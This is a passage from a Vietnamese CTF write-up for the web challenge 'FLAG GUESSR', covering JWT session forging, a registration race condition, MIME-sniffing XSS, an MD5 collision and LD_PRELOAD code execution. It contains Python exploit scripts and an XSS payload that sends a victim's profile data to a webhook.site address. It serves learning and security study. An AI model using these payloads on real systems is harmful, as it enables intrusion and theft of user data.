@@ -1,0 +1,962 @@
+               
+
+<!DOCTYPE html>
+<html lang="en"><head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    <meta charset="utf-8">
+    <link rel="shortcut icon" href='http://localhost:1313/favicon.ico' type="image/x-icon">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    
+
+    <title>FLAG GUESSR - 3HLD</title>
+
+    
+
+    
+
+    
+    <meta name="author" content="3HLD" />
+    
+
+    
+        <meta property="og:title" content="FLAG GUESSR" />
+<meta property="og:description" content="L3AK CTF Write up cho bài mình không solve ra trong giải
+Knowledge : Dynamical link with LD_PRELOAD , Bypass Sessions , Md5 collision
+Bài này có 2 cách : Unintended và intended nhưng mình sẽ nói sơ qua về walkthrough trước nhé
+Walthrough : Mục tiêu của bài này là lấy được RCE thông qua một đống chain&hellip;
+Trong giải thì bài này mình bị kẹt vì mắc một cái bẫy CSRF khá đần ." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://localhost:1313/writeups/l3akctf2025/flagguessr/" /><meta property="article:section" content="writeups" />
+
+
+
+
+    
+
+    
+        <meta name="twitter:card" content="summary"/><meta name="twitter:title" content="FLAG GUESSR"/>
+<meta name="twitter:description" content="L3AK CTF Write up cho bài mình không solve ra trong giải
+Knowledge : Dynamical link with LD_PRELOAD , Bypass Sessions , Md5 collision
+Bài này có 2 cách : Unintended và intended nhưng mình sẽ nói sơ qua về walkthrough trước nhé
+Walthrough : Mục tiêu của bài này là lấy được RCE thông qua một đống chain&hellip;
+Trong giải thì bài này mình bị kẹt vì mắc một cái bẫy CSRF khá đần ."/>
+
+    <link rel="stylesheet" href="/style.css" integrity="">
+
+
+
+    <link rel="stylesheet" href="/lib/css/prism.css" integrity="">
+
+
+
+    
+        <script
+  id="MathJax-script"
+  async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"
+></script>
+<script>
+  MathJax = {
+    tex: {
+      displayMath: [
+        ["\\[", "\\]"],
+        ["$$", "$$"],
+      ], 
+      inlineMath: [
+        ["\\(", "\\)"],
+        ["$", "$"],
+      ], 
+    },
+  };
+</script>
+
+    
+
+    
+    <script>
+        if (!('theme' in localStorage)) {
+            localStorage.theme = 'dark';
+        }
+
+        if (localStorage.theme === 'dark' || (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
+            document.documentElement.setAttribute("data-theme", "dark");
+        } else {
+            document.documentElement.setAttribute("data-theme", "light");
+        }
+    </script>
+<script defer src="/js/header.js" integrity=""></script>
+
+
+
+    <script defer src="/js/zooming.js" integrity=""></script>
+
+
+
+
+
+
+
+    
+        
+
+        
+        
+
+        
+        
+            
+        
+
+        <script defer src="/js/prism.js" integrity="" data-manual></script>
+    
+
+
+
+    
+    
+    
+    <script defer src="/js/search-en.js" integrity=""></script>
+
+
+
+
+<link rel="stylesheet" href="http://localhost:1313/user.css">
+
+    
+
+</head>
+<body><header>
+    <div id="header_left">
+        <div id="sidebar_btn">
+            <input type="checkbox" id="sidebar_btn_input" class="hidden" />
+            <label id="sidebar_btn_label" for="sidebar_btn_input">
+                <svg id="menu_icon" width="26px" height="26px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="3" y1="12" x2="21" y2="12"></line><line x1="3" y1="6" x2="21" y2="6"></line><line x1="3" y1="18" x2="21" y2="18"></line>
+</svg>
+
+</svg>
+            </label>
+            <label id="sidebar_canvas_overlay_wrapper" for="sidebar_btn_input">
+                <div id="sidebar_canvas_overlay"></div>
+            </label>
+            <div id="sidebar">
+                <ul><li>
+                            <a href="/">💻 About</a></li><li>
+                            <a href="/news/">📰 News</a></li><li>
+                            <a href="/writeups/">📑 Writeups</a></li></ul>
+            </div>
+        </div>
+    
+        <div class="brand">
+            <div>
+                <a href="/">3HLD</a>
+            </div>
+        </div>
+    </div>
+
+    <div class="toolbox">
+        <div id="theme_tool">
+            <svg id="dark_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <circle cx="12" cy="12" r="5"></circle><line x1="12" y1="1" x2="12" y2="3"></line><line x1="12" y1="21" x2="12" y2="23"></line><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line><line x1="1" y1="12" x2="3" y2="12"></line><line x1="21" y1="12" x2="23" y2="12"></line><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+</svg>
+
+</svg>
+            <svg id="light_mode_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+</svg>
+
+</svg>
+        </div>
+
+        
+            <div id="search_tool">
+                <svg id="search_btn" class="toolbox-btn" width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <circle cx="11" cy="11" r="8"></circle><line x1="21" y1="21" x2="16.65" y2="16.65"></line>
+</svg>
+
+</svg><div id="search_menu_wrapper" class="hidden">
+    <div id="search_menu">
+        <div id="search_menu_toolbar">
+            <div id="search_menu_input_wrapper">
+                <input id="search_menu_input" type="text" placeholder='Search Posts'>
+            </div>
+            <div id="search_menu_close_btn">
+                <svg width="18px" height="18px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="18" y1="6" x2="6" y2="18"></line><line x1="6" y1="6" x2="18" y2="18"></line>
+</svg>
+
+</svg>
+            </div>
+        </div>
+        <div id="search_menu_results">
+        </div>
+    </div>
+</div>
+</div>
+        
+
+        
+    </div>
+</header>
+<nav id="navbar" class="pure-menu">
+    <ul class="pure-menu-list"><li class="navbar-item pure-menu-item ">
+                    
+                        <a href="/" class="pure-menu-link">💻 About</a>
+                    
+                </li><li class="navbar-item pure-menu-item ">
+                    
+                        <a href="/news/" class="pure-menu-link">📰 News</a>
+                    
+                </li><li class="navbar-item pure-menu-item insection">
+                    
+                        <a href="/writeups/" class="pure-menu-link">📑 Writeups</a>
+                    
+                </li></ul>
+</nav>
+<main>
+      <div id="content" class="content-margin">
+        
+    
+    <details class="collapsible-menu-wrapper"><summary class="collapsible-menu-type"><span>Table of contents</span></summary><div class="collapsible-menu">
+        
+            <nav id="TableOfContents">
+  <ul>
+    <li><a href="#walthrough-">Walthrough :</a></li>
+  </ul>
+
+  <ul>
+    <li>
+      <ul>
+        <li><a href="#forge-jwt-key">Forge JWT KEY</a></li>
+      </ul>
+    </li>
+    <li><a href="#bypass-checkusername">Bypass checkUsername</a></li>
+    <li><a href="#intend">Intend</a></li>
+    <li><a href="#new-knowledge">New knowledge</a></li>
+    <li><a href="#rút-kinh-nghiệm-">Rút kinh nghiệm :</a></li>
+  </ul>
+</nav>
+        
+    </div></details>
+
+
+
+<div class="tags">
+  
+    <div class="badge">web</div>
+
+  
+    <div class="badge">499 points</div>
+
+  
+    <div class="badge">6 solves</div>
+
+  
+    <div class="badge">downgrade</div>
+
+  
+</div>
+
+<div>
+  <p class="date">
+    Last edit: Jan 1, 1
+  </p>
+</div>
+
+
+    <div class="content-margin">
+
+
+
+<article >
+    
+    
+        
+        
+    
+    
+<h1 id="l3ak-ctf" class="header-anchor-wrapper">L3AK CTF
+  <a href="#l3ak-ctf" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h1>
+
+<p><strong>Write up cho bài mình không solve ra trong giải</strong></p>
+<p><strong>Knowledge : Dynamical link with LD_PRELOAD , Bypass Sessions , Md5 collision</strong></p>
+<p>Bài này có 2 cách :  Unintended và intended nhưng mình sẽ nói sơ qua về walkthrough trước nhé</p>
+
+<h2 id="walthrough-" class="header-anchor-wrapper">Walthrough :
+  <a href="#walthrough-" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h2>
+
+<p>Mục tiêu của bài này là lấy được RCE thông qua một đống chain&hellip;</p>
+<p>Trong giải thì bài này mình bị kẹt vì mắc một cái bẫy CSRF khá đần .
+Mình thấy bug csrf ròi tìm cách làm đủ thứ nhưng hầu như chả có tác dụng gì và mình biết thấy mọi attack vector muốn hoạt động được thì đều cần forge được session nhưng vì để forge được quá khó nên hầu như mình bí ngậm ngùi&hellip;</p>
+
+<h1 id="đọc-write-up" class="header-anchor-wrapper">Đọc write up
+  <a href="#%c4%91%e1%bb%8dc-write-up" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h1>
+
+<p>Cách unintended có vẻ dễ hiểu hơn nên ta sẽ bắt đầu  với nó .
+Idea chính để lên được RCE là set được biến môi trường  :</p>
+<pre  class="mc-prism hide language-text" ><code class="language-sh">     LD_PRELOAD =./route/to/my/flag.txt
+</code></pre>
+<p>Đây là cách duy nhất để ta có thể lấy RCE nhưng mình không biết cái này nên cũng bí từ đầu ròi &hellip;
+Ok vậy làm sao để attack được vào biến môi trường thì trong source chỉ có một đoạn ảnh hưởng đến ENV thoi</p>
+<pre  class="mc-prism hide language-text" ><code class="language-go">	cmd.Env = append(os.Environ(), fmt.Sprintf(&quot;correct_guesses=%d&quot;, u.FlagsFound))
+	cmd.Env = append(cmd.Env, fmt.Sprintf(&quot;total_attempts=%d&quot;, u.FlagsChecked))
+	// cai nay weird vc dang le ra phai thay chu ta : )
+	for k, v := range session.Properties {
+		cmd.Env = append(cmd.Env, fmt.Sprintf(&quot;%s=%s&quot;, k, v))
+	}
+</code></pre>
+<p>Ở đây ta thấy biến ENV sẽ được set theo Properties của session bằng vòng for loop ..
+Đáng lẽ ở đây mình nên nhận ra điều này sớm hơn vì khi ta tạo một user bình thường thì <strong>properties</strong> chỉ chứa đúng duy nhất một key thì tạo vòng for loop để làm chi :0 . Điều này dẫn đến việc ta cần phải tìm cách để forge được một jwt bất kì .</p>
+
+<h3 id="forge-jwt-key" class="header-anchor-wrapper">Forge JWT KEY
+  <a href="#forge-jwt-key" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h3>
+
+<p>Trong giải thì mình nghĩ đến cách sẽ leak JWT KEY bằng cách nào đó nhưng hầu như không có cách nào cả và mình bí típ : )</p>
+<p>Thì cách unintended sẽ lợi dụng một cái bug ở register như sau  :</p>
+<pre  class="mc-prism hide language-text" ><code class="language-go">
+func Register(w http.ResponseWriter, r *http.Request) {
+	session, valid, resp, err := RequestMiddleware(w, r)
+	resp.Body = &quot;/register&quot;
+	// BUG NOT CHECK VALID ?
+	defer resp.respondRedirect()
+	if err != nil {
+		resp.Body = &quot;/register?e=bad request&quot;
+		return
+	}
+	if valid &amp;&amp; session.LoggedIn {
+		resp.Body = &quot;/home&quot;
+		return
+	}
+	// Sign everything we want
+	// Defer call when packnick and all trime
+	defer session.UpdateSession(w)
+
+	flagFile, _, err := r.FormFile(&quot;flag&quot;)
+	if err != nil {
+		session.ClearSession()
+		resp.Body = &quot;/register?e=bad request&quot;
+		return
+	}
+	username := r.FormValue(&quot;username&quot;)
+	password := r.FormValue(&quot;password&quot;)
+	displayName := r.FormValue(&quot;display_name&quot;)
+	if len(username) == 0 {
+		session.ClearSession()
+		resp.Body = &quot;/register?e=missing username&quot;
+		return
+	} else if len(password) == 0 {
+		session.ClearSession()
+		resp.Body = &quot;/register?e=missing password&quot;
+		return
+	} else if len(displayName) == 0 {
+		session.ClearSession()
+		resp.Body = &quot;/register?e=missing display name&quot;
+		return
+	}
+	newUser := &amp;User{
+		Username:    strings.ToLower(username),
+		DisplayName: displayName,
+		Password:    password,
+		UserType:    UserKindStandard,
+		UserID:      uuid.NewString(),
+	}
+	// doan nay bi race condition
+	available, err := newUser.CheckUsernameAvailable()
+	if err != nil {
+		session.ClearSession()
+		resp.Body = &quot;/register?e=bad request&quot;
+		return
+	}
+	if !available {
+		session.ClearSession()
+		resp.Body = &quot;/register?e=username taken&quot;
+		return
+	}
+	err = os.MkdirAll(fmt.Sprintf(&quot;./userdata/%s/uploads&quot;, newUser.UserID), 0644)
+	if err != nil {
+		session.ClearSession()
+		resp.Body = &quot;/register?e=internal server error&quot;
+		return
+	}
+	f, err := os.OpenFile(fmt.Sprintf(&quot;./userdata/%s/flag.txt&quot;, newUser.UserID), os.O_WRONLY|os.O_CREATE, 0644)
+	if err != nil {
+		session.ClearSession()
+		resp.Body = &quot;/register?e=internal server error&quot;
+		return
+	}
+	defer f.Close()
+	_, err = io.Copy(f, flagFile)
+	if err != nil {
+		session.ClearSession()
+		resp.Body = &quot;/register?e=internal server error&quot;
+		return
+	}
+	// Chi co o day la khong clear session =))
+	err = newUser.InsertUser()
+	if err != nil {
+		resp.Body = &quot;/register?e=bad request&quot;
+		return
+	}
+	session.InitSession(newUser)
+	resp.Body = &quot;/home&quot;
+}
+</code></pre>
+<ul>
+<li>Ở đây ta thấy sau khi check session invalid thì đáng lẽ phải return khỏi hàm luôn nhưng ở đây thì check thiếu cái đấy. Dẫn đến việc hàm defer UpdateSession sẽ được gọi và <strong>sign</strong> luôn cái session cookie của mình và đến đoạn này đáng lẽ ta sẽ có được cookie đã được sign nhưng sẽ bị clear nếu như <strong>session.ClearSession</strong> được gọi.</li>
+<li>Đọc tiếp ta sẽ thấy chỉ duy nhất một case Session không bị clear là đoạn newUser.InsertUser() . Để hàm này bị error thì ta chỉ cần tạo 2 user giống username và display_name là được vì trong config của db :</li>
+</ul>
+<pre  class="mc-prism hide language-text" ><code class="language-go">`CREATE TABLE users (user_id text UNIQUE, username text COLLATE NOCASE, password text, display_name text, description text NULL, user_type integer, cheater integer, PRIMARY KEY (username, display_name));`
+</code></pre>
+<ul>
+<li>Ta thấy PRIMARY KEY ở đây gồm cả (username,display_name) tức là một cặp này phải là unique.</li>
+<li>Vậy đến đây ta chỉ cần tạo 2 user giống nhau ? Không , ở trên có một đoạn checkUsernameAvaiable nữa.</li>
+</ul>
+
+<h2 id="bypass-checkusername" class="header-anchor-wrapper">Bypass checkUsername
+  <a href="#bypass-checkusername" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h2>
+
+<ul>
+<li>Để qua được hàm này thì ta có thể để ý đến cái case được chỉ định cho username trong config là <strong>COLLATE NOCASE</strong> và nghĩ đến việc tryền 2 username khác case nhau nhưng đã bị block bởi toLowerCase() .</li>
+<li>Để bypass đoạn này thì ta có 2 cách dẫn đến 2 solution khác nhau :</li>
+</ul>
+<ol>
+<li>Race condition</li>
+<li>Leak display_name</li>
+</ol>
+<p>Mình sẽ giải thích cách 2 sau. Cách 1 thì race condition thì đấy , race thôi&hellip;.</p>
+<p>Script của mình như sau  :</p>
+<pre  class="mc-prism hide language-text" ><code class="language-python">import requests
+import threading
+
+import jwt
+
+
+JWT_KEY =&quot;FUCK&quot;
+FLAG_SO_ID  = &quot;&quot;
+MALICOUS_SESSION  =&quot;&quot;
+
+
+url =  &quot;http://localhost:5555&quot;
+
+url = &quot;http://34.59.119.124:17005&quot;
+def register(username, password):   
+    s=  requests.Session()
+    data = {
+        &quot;username&quot;: username,
+        &quot;password&quot;: password,
+        &quot;display_name&quot;: &quot;1337&quot;,
+    }
+    payload = {&quot;username&quot;:&quot;sa&quot;,&quot;user_id&quot;:FLAG_SO_ID,&quot;display_name&quot;:&quot;1337&quot;,&quot;user_kind&quot;:0,&quot;flags_checked&quot;:0,&quot;flags_found&quot;:0,
+            &quot;properties&quot; : {
+            &quot;description&quot; : &quot;FUCk&quot; ,
+            &quot;LD_PRELOAD&quot; :  f&quot;/app/userdata/{FLAG_SO_ID}/flag.txt&quot;,
+    },&quot;logged_in&quot; :True}
+
+    token = jwt.encode(payload, JWT_KEY, algorithm=&quot;HS256&quot;)
+    with open(&quot;flag.so&quot;, &quot;rb&quot;) as flag_file:
+        files = {&quot;flag&quot;: flag_file}
+        cookies = {&quot;session&quot;: token}
+        response = requests.post(f&quot;{url}/register&quot;,data=data, files=files, cookies=cookies, allow_redirects=False)
+        print(response.cookies)
+        return response
+
+def login(username, password):
+    s = requests.Session()
+    data = {
+        &quot;username&quot;: username,
+        &quot;password&quot;: password,
+    }
+    response = s.post(f&quot;{url}/login&quot;, data=data,allow_redirects=False)
+    print(response.cookies)
+    return s
+
+
+
+def getProfile(session):
+    res = session.get(url+'/api/profile',allow_redirects=False)
+    print(res.text)
+    return res.json()['user_id']
+
+
+username = &quot;sa&quot;
+password =  &quot;s&quot;
+register(username,password)
+s=  login(username,password)
+FLAG_SO_ID = getProfile(s)
+print(f&quot;FLAG_SO_ID: {FLAG_SO_ID}&quot;)
+
+## Start RACE CONDITION TO BYPASS CHECKUSERNAME AND REACH THE INSERT  ###J
+username=&quot;aaaa&quot;
+password =&quot;s&quot;
+
+t1 = threading.Thread(target=register, args=(username, password))
+t2 = threading.Thread(target=register, args=(username, password))
+
+t1.start()
+t2.start()
+t1.join()
+t2.join()
+
+</code></pre>
+<p><strong>Flow :</strong></p>
+<ol>
+<li>Upload So File</li>
+<li>Forge session with race conditon</li>
+<li>Make ceritficate with forged session</li>
+</ol>
+
+<h2 id="intend" class="header-anchor-wrapper">Intend
+  <a href="#intend" class="header-anchor-link">
+    <svg width="16px" height="16px" viewBox="0 0 24 24">
+<svg
+    xmlns="http://www.w3.org/2000/svg"
+    width="24" height="24" viewBox="0 0 24 24" fill="none"
+    stroke="currentColor" stroke-width="2" stroke-linecap="round"
+    stroke-linejoin="round">
+    <line x1="4" y1="9" x2="20" y2="9"></line><line x1="4" y1="15" x2="20" y2="15"></line><line x1="10" y1="3" x2="8" y2="21"></line><line x1="16" y1="3" x2="14" y2="21"></line>
+</svg>
+
+</svg>
+  </a>
+</h2>
+
+<p>Leak display_name .
+Bởi vì username admin luôn được tạo với Admin-* nên case của ta sẽ không bao giờ bị catch :&gt; . Vậy vấn đề để trigger bug thì phải insert đúng chính xác display_name .
+Đến đây thì mình có nghĩ đến cách CSRF vì có bug CSRF :) nma ko có effect vì có cors :( :sadge</p>
+<ul>
+<li>
+<p>Vậy thứ ta cần ở đây là XSS. Chỗ nào có xss nhỉ ? Check trên các page html thì ta không hề thấy sự xuất hiện của innerHTML nên ta có thể loại bỏ trường hợp này.</p>
+</li>
+<li>
+<p>Nhưng server có thể trả về response theo 2 cách , 1 trong 2 cách đó là trả về <strong>RAW RESPONSE</strong></p>
+</li>
+</ul>
+<pre  class="mc-prism hide language-text" ><code class="language-go">
+func (r *Response) respondRaw() error {
+	if r.Responded {
+		return nil
+	}
+	if r.RespCode == 0 {
+		r.RespCode = http.StatusOK
+	}
+	r.Writer.WriteHeader(r.RespCode)
+	respBytes, ok := r.Body.([]byte)
+	if !ok {
+		return fmt.Errorf(&quot;invalid body&quot;)
+	}
+	_, err := r.Writer.Write(respBytes)
+	r.Responded = true
+	return err
+}
+</code></pre>
+<p>Bug này khá giống với MIME SNIFFER của chromium khi sẽ auto detect content type dựa trên các 512 bytes đầu tiên có khá nhiều cách : <a href="https://chromium.googlesource.com/chromium/src/net/+/master/base/mime_sniffer.cc">https://chromium.googlesource.com/chromium/src/net/+/master/base/mime_sniffer.cc</a>
+Đơn giản là chèn <!DOCTYPE> prefix vào phía trước thôi.</p>
+<ul>
+<li>Vậy hàm này được sử dụng ở đâu ?</li>
+</ul>
+<pre  class="mc-prism hide language-text" ><code class="language-go">func GetGuess(w http.ResponseWriter, r *http.Request) {
+	session, valid, resp, err := RequestMiddleware(w, r)
+	defer resp.respond()
+	if err != nil {
+		return
+	}
+	if !valid || !session.LoggedIn {
+		session.ClearSession()
+		session.UpdateSession(w)
+		resp.setError(fmt.Errorf(&quot;not logged in&quot;), http.StatusUnauthorized)
+		return
+	}
+	defer session.UpdateSession(w)
+
+	guesserID := r.PathValue(&quot;guesser_id&quot;)
+	guessID := r.PathValue(&quot;guess_id&quot;)
+	guesser, err := FindUser(guesserID)
+	if err != nil {
+		resp.setError(fmt.Errorf(&quot;user not found&quot;), http.StatusBadRequest)
+		return
+	}
+	guess, err := guesser.FindGuess(guessID)
+	if err != nil {
+		resp.setError(fmt.Errorf(&quot;guess not found&quot;), http.StatusBadRequest)
+		return
+	}
+	if session.UserKind != UserKindAdmin &amp;&amp; guess.GuesserID != session.UserID {
+		resp.setError(fmt.Errorf(&quot;only admins can see other users' guesses&quot;), http.StatusBadRequest)
+		return
+	}
+	guessPath := guess.GetFilePath()
+	guessBytes, err := os.ReadFile(guessPath)
+	if err != nil {
+		resp.setError(fmt.Errorf(&quot;incorrect guesses not saved&quot;), http.StatusBadRequest)
+		return
+	}
+	resp.Body = guessBytes
+	resp.respondRaw()
+}
+</code></pre>
+<p>Xài duy nhất ở hàm này. Hàm này sẽ đọc từ file đã guess của user và trả về response nên ta cần handle được nội dung trong file đấy. Phần khó chính là hàm checkFlag khá khó chịu  :</p>
+<pre  class="mc-prism hide language-text" ><code class="language-go">func CheckFlag(w http.ResponseWriter, r *http.Request) {
+	session, valid, resp, err := RequestMiddleware(w, r)
+	defer resp.respond()
+	if err != nil {
+		return
+	}
+	if !valid || !session.LoggedIn {
+		session.ClearSession()
+		session.UpdateSession(w)
+		resp.setError(fmt.Errorf(&quot;not logged in&quot;), http.StatusUnauthorized)
+		return
+	}
+	defer session.UpdateSession(w)
+
+	if r.ContentLength == 0 {
+		resp.setError(fmt.Errorf(&quot;missing body&quot;), http.StatusBadRequest)
+		return
+	}
+	defer r.Body.Close()
+
+	flagGuess := r.FormValue(&quot;flag&quot;)
+	flagHolderID := r.PathValue(&quot;id&quot;)
+
+	u, err := FindUser(flagHolderID)
+	if err != nil {
+		resp.setError(fmt.Errorf(&quot;user not found&quot;), http.StatusBadRequest)
+		return
+	}
+	if u.UserID == session.UserID {
+		resp.setError(fmt.Errorf(&quot;you can't guess your own flag&quot;), http.StatusBadRequest)
+		return
+	}
+
+	guess := Guess{
+		GuessID:      uuid.NewString(),
+		GuesserID:    session.UserID,
+		FlagHolderID: u.UserID,
+		Correct:      false,
+	}
+	alreadyFound, err := guess.CheckFound()
+	if err != nil {
+		resp.setError(err, http.StatusBadRequest)
+		return
+	}
+	if alreadyFound {
+		resp.setError(fmt.Errorf(&quot;you already found that flag&quot;), http.StatusBadRequest)
+		return
+	}
+	err = guess.InsertGuess()
+	if err != nil {
+		resp.setError(err, http.StatusBadRequest)
+		return
+	}
+
+	guessPath := guess.GetFilePath()
+	err = os.WriteFile(guessPath, []byte(flagGuess), 0644)
+	if err != nil {
+		resp.setError(err, http.StatusBadRequest)
+		return
+	}
+	correct, md5, sha := guess.CheckGuess()
+	if correct {
+		guess.MarkCorrect()
+	}
+	if !correct {
+		os.Remove(guessPath)
+	} else {
+		os.WriteFile(guessPath, []byte(fmt.Sprintf(&quot;MD5: %s\nSHA256: %s&quot;, md5, sha)), 0644)
+	}
+	resp.Body = FlagCheckResponse{Correct: correct}
+}
+
+</code></pre>
+<p>Hàm này sẽ kiểm tra md5sum của 2 file có bằng nhau không và sha256 của 2 file có bằng nhau không , nếu không bằng nó sẽ xóa file còn nếu bằng thì nó sẽ viết giá trị của MD5 và SHA256 vào file ?</p>
+<ul>
+<li>Cả 2 điều kiện trên mình đều thật sư không cần &hellip;</li>
+<li>Vậy phải làm sao để ghi file của mình vào ? Đọc vào hàm CheckGuess ta có thể thấy một trigger sau khá dị</li>
+</ul>
+<pre  class="mc-prism hide language-text" ><code class="language-go">func (g *Guess) CheckGuess() (bool, string, string) {
+    ...
+	if md5Equal != shaEqual {
+		g.MarkCheater()
+	}
+    ...
+</code></pre>
+<p>Nếu như md5 bằng nhưng sha không bằng thì sẽ gọi MarkCheater ?
+Và trolling ở đây là hàm MarkCheater này sẽ gây crash program do thiếu dấu &ldquo;?&rdquo;  holy fack</p>
+<pre  class="mc-prism hide language-text" ><code class="language-go">	MARK_CHEATER         = `UPDATE users SET cheater = 1 WHERE user_id = ;`
+</code></pre>
+<p>MÌnh đã không nghĩ tới trường hợp này trong lúc giải và cũng đã không test thử function này đó là lý do mình ko tìm được bug . Vì serverr hỗ trợ autorestart nên lúc này hàm crash và file của mình sẽ không bị xóa .
+Nhưng còn một điều nữa là mình cần phải có md5 EQUAL thì cái nì khá đơn giản vì có lỗi md5 collision khá nổi tiếng và có tool hỗ trợ là fastcoll .</p>
+<ul>
+<li>Khi có được xss thì ta chỉ cần redirect bot tới :
+/api/users/{guesser_id}/guesses/guess_id</li>
+<li>Stole được display_name và register với username admin và display_name cùng với session cần được signed và phần còn lại như trên</li>
+</ul>
+<p>Script của mình  :</p>
+<pre  class="mc-prism hide language-text" ><code class="language-py">import requests
+import threading
+
+import jwt
+
+admin_username = &quot;admin-71aaf14e-55d3-4a88-8c31-e9db2f265c3e&quot;
+admin_displayName = &quot;eccdce48-7f26-421b-9d75-65f7002453d5&quot;
+
+JWT_KEY =&quot;FUCK&quot;
+FLAG_SO_ID  = &quot;&quot;
+MALICOUS_SESSION  =&quot;&quot;
+
+url =  &quot;http://localhost:5555&quot;
+url = &quot;http://34.59.119.124:17005&quot;
+XSS_PATH = &quot;&quot;
+
+
+def register(username, password,display_name=&quot;1337&quot;,payload=None):   
+    s=  requests.Session()
+    data = {
+        &quot;username&quot;: username,
+        &quot;password&quot;: password,
+        &quot;display_name&quot;: display_name,
+    }
+    
+
+    token = &quot;&quot;
+    if payload : 
+        token = jwt.encode(payload, JWT_KEY, algorithm=&quot;HS256&quot;)
+    with open(&quot;flag.so&quot;, &quot;rb&quot;) as flag_file:
+        files = {&quot;flag&quot;: flag_file}
+        cookies = {&quot;session&quot;: token}
+        response = requests.post(f&quot;{url}/register&quot;,data=data, files=files, cookies=cookies, allow_redirects=False)
+        print(response.cookies)
+        return response
+
+def login(username, password):
+    s = requests.Session()
+    data = {
+        &quot;username&quot;: username,
+        &quot;password&quot;: password,
+    }
+    response = s.post(f&quot;{url}/login&quot;, data=data,allow_redirects=False)
+    print(response.cookies)
+    return s
+
+
+
+def getProfile(session):
+    res = session.get(url+'/api/profile',allow_redirects=False)
+    print(res.text)
+    return res.json()
+
+def bot(session) :  
+    global XSS_PATH
+    payload = &quot;fetch('/api/profile').then(res=&gt;res.json()).then(text=&gt;fetch('https://webhook.site/49982724-4ed4-4980-bdbc-f7efed1b6335?q='+text.display_name+'&amp;u='+text.username))&quot;
+    data = {
+        &quot;url&quot;  : XSS_PATH + &quot;#&quot; +payload
+    }
+    res = session.post(url+'/api/report',json=data)
+    print(res.text)
+
+def createMsg1(username,password):
+    s=  requests.Session()
+    data = {
+        &quot;username&quot;:username,
+        &quot;password&quot;: password,
+        &quot;display_name&quot;: &quot;1337&quot;,
+    }
+    with open(&quot;msg1.bin&quot;, &quot;rb&quot;) as flag_file:
